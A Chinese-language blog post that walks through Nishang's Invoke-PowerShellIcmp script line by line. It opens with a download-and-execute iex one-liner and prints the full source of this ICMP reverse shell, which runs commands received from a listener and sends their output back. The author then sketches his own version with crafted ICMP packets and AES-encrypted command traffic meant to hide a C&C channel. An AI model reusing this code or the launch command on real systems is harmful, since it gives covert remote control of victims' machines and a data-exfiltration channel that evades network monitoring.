# nishang脚本分析

## 脚本分析

先介绍一下使用，这里分析的是icmp协议反弹shell的脚本，下面是使用方法：

powershell iex (New-Object Net.WebClient).DownloadString('http://地址/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress [反弹地址]

其他脚本使用方法类似，还是因为默认执行策略的原因，最好还是用下载的方式远程加载脚本，即使这是最容易被提示风险的。

下面是关于脚本每一步的分析：

```
function Invoke-PowerShellIcmp
{ 
<#
.SYNOPSIS
Nishang script which can be used for a Reverse interactive PowerShell from a target over ICMP. 
.DESCRIPTION
This script can receive commands from a server, execute them and return the result to the server using only ICMP.
The server to be used with it is icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh).
.PARAMETER IPAddress
The IP address of the server/listener to connect to.
.PARAMETER Delay
Time in seconds for which the script waits for a command from the server. Default is 5 seconds. 
.PARAMETER BufferSize
The size of output Buffer. Defualt is 128.
.EXAMPLE
# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_m.py 192.168.254.226 192.168.254.1
Run above commands to start a listener on a Linux computer (tested on Kali Linux).
icmpsh_m.py is a part of the icmpsh tools.
On the target, run the below command.
PS > Invoke-PowerShellIcmp -IPAddress 192.168.254.226
Above shows an example of an interactive PowerShell reverse connect shell. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html
https://github.com/samratashok/nishang
#>   

#   这里开始

#   函数参数

    [CmdletBinding()] Param(

        # ip地址
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        # 延迟秒数
        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        # 命令的数据包大小
        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )

    #Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response

    # 调用ping的.net对象
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping

    # 调用ping设置的.net对象,DontFragment=True表示可以将传输数据分成多个包传输
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True

    # Shell appearance and output redirection based on Powerfun - Written by Ben Turner & Dave Hardy

    # 发送信息为 [Windows PowerShell running as user Fay.D.Flourite on DESKTOP-LGQQ5JH\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\n] 的ascii编码信息，out-null放弃输出。这里和底下同为模拟powershell的输出界面。

    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    #Show an interactive PowerShell prompt
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    while ($true)
    {   
        # while True发送空字节用于接收server发送的命令，并判断数据包
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        
        #Check for Command from the server
        if ($reply.Buffer)
        {   
            #取出数据包中缓冲区的命令
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)

            # invoke-Expression 简写iex 用于执行命令 2>&1 表示把错误输出定向到输出中
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)

            # 用于计算需要发送的数据包的个数然后取整，小于规定长度除后取整就是0
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0

            # 判断发送长度是否大于规定数据包长度
            #Fragmant larger output into smaller ones to send to the server.
            if ($sendbytes.length -gt $BufferSize)
            {   
                # 判断i是否小于index，将result分成每128字节发送一次
                while ($i -lt $index )
                {
                    # 截取sendbyte的128位发送
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }

                # 取余数判断长度是否为规定长度的整数倍，是就跳过，不是就发送剩余的值
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            # 不大于，则只发一个包
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            # 同样模拟ps界面
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        # 如果没取到命令就休眠指定秒数
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
```

这里还有点PingOptions类的资料：

PingOptions 类提供Ttl和 DontFragment 属性以控制如何传输 Internet 控制消息协议 (ICMP) 回送请求数据包。

Ttl 属性不多说，就是原来那味儿

DontFragment 属性控制是否可将发送到远程主机的数据分成多个数据包。如果要测试用于传输数据包的路由器和网关的最大传输单元 (MTU)，此选项很有用。

由nishang这个脚本就可以看到powershell脚本和.net密不可分的关系。

这里使用的是程序集中的system.net中的ping，当然也可以自己写c#创建一个自己的模块用于控制数据包。

## 造轮子

明白后我们就开始造轮子

但是这里调用的System.Net.NetworkInformation.Ping并不能控制诸如类型seq之类的值。用这个肯定是可以实现的，所以我们换一种方式，我找到了System.Net.Socket能发送构造数据包

所以我们要实现的点基本如下：

- aes加密流量，且能在python和powershell两种不同语言中互相加密解密
- 控制流量包参数，以类似之前python半连接脚本的方式构造流量包

### 构造数据包

上面也说了，我们引入System.Net.Socket来发送数据包。

可以像nishang那样完全用powershell完成，但我想尝试用c#来写一下- -

由于powershell和.net的兼容性好的实在离谱。。我们可以直接写C#代码，用add-type引入

`Add-type -TypeDefinition $a`

这里的TypeDefinition是默认，即CSharp，它支持的语言还有vb，js等等等等...

先是流量包的构造，icmp的结构之前python半连接后门已经说的比较清楚了，就不介绍了，这里构造只需要创建byte数组，向里面写入数据就行。

最好是创建一个类来储存各种数据，过后再依次写入。

```
public class IcmpPacket
    {
        public Byte Type;    // type of message 
        public Byte SubCode;    // type of sub code 
        public UInt16 CheckSum;   // ones complement checksum of struct 
        public UInt16 Identifier;      // identifier 
        public UInt16 SequenceNumber;     // sequence number 
        public Byte[] Data;

    }
```

但是这里的Type，如果换成8以外的话，发送数据会报错(个人认为是因为其他type的数据包和type=8的数据包不同造成的，这点之前python后门的文章中有提到，但是python的scapy库能够自动转换，而我们的程序集不会...)。我这里不想再重新构造了，就选择正常的Type=8，用seq来传输aes密钥，

icmp是不需要端口的，我们也就不用socket去连接端口再发送，先初始化socket，将目标ip转换成endpoint类型，用SendTo去发送(这些用法最好去微软官方文档查，又方便又详细)

<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.net.sockets.socket.sendto?view=netframework-4.7.2#System_Net_Sockets_Socket_SendTo_System_Byte___System_Int32_System_Int32_System_Net_Sockets_SocketFlags_System_Net_EndPoint_"> 文档传送门 </a>

接收也用ReceiveFrom接收指定endpoint的数据。

由于type=8会有对方的返回数据，我们需要先接收了对方的返回数据，再继续接收c&c服务器发送的指令。


### 数据加密

powershell的aes加密也有对应的程序集可以实现：`System.Security.Cryptography.AesManaged`

我用了网上常见的aes加密解密函数

```
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key $IV
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
```

这里的填充模式要用PKCS7才能和python那边互相加密解密...不知道为什么

然后是python那边的加密解密

```
import base64

from Crypto import Random
from Crypto.Cipher import AES

key = "SuperSecret" #Insecure and just for testing
plaintext = "Secret message please don't look"

class AESCipher:

    def __init__(self, key):
        self.key = key.encode('utf-8')

    def encrypt(self, raw):
        raw = pad(raw).encode('utf-8')
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt(self,encryptstring):
        decrypted = encryptstring.encode()
        decrypted = base64.b64decode(decrypted)
        iv = decrypted[0:16]
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        result = cipher.decrypt(decrypted)
        result = result[16:-1]
        return result

paddedKey = key
cipher = AESCipher(paddedKey)

encrypted = bytes.decode(cipher.encrypt(plaintext))

result = cipher.decrypt(encrypted)
result = bytes.decode(result).rstrip('\0')

```

相对就比powershell这边要简单,也要注意解密时候填充值的删除(这里也有点头疼，有些填充值还不是空格)

用对应的key就可以实现

完成了相应功能后再将脚本完善，以下为结果

<img src='https://0xfay.github.io/public/image/141015.jpg'>

这是流量加密后的报文，data部分是加密内容，而seq就是我们随机出来的密钥

我们将这些拿到python解密脚本中

<img src='https://0xfay.github.io/public/image/141411.jpg'>

红色部分是我们上文中的加密内容，而蓝色部分是密钥

可以看到，也成功的解密出了powershell执行的加密的内容。

### 数据接收处理

由于c#这边并不会自己解析数据包获取里面的值（或是说默认的没有，需要引入外部程序集），所以只有我们自己截取byte长度来获取我们想要的数据。

获取seq的话我们是先以16进制形式去截取数据中的seq，再把它转回来。

至少我们发送的数据包格式是固定的，前面非buffer部分长度都是一定的，所以还是很好分段去处理

# 摸了摸了

这是目前的进度，能完成数据包的发送以及流量的加密解密，还是很想把这个项目完成的。但迫于挂科要去复习高数大物了。。

下一步是先用python把c&c服务器写了，主要是接收对方发来的结果，流量加解密和发送指令（其实可以拿之前写的icmp后门魔改，问题不大），然后就是这边接收指令执行得到结果了（其实写了，但是因为服务端没写所以没试过）

想要当前进度做一个参考的可以底下评论（




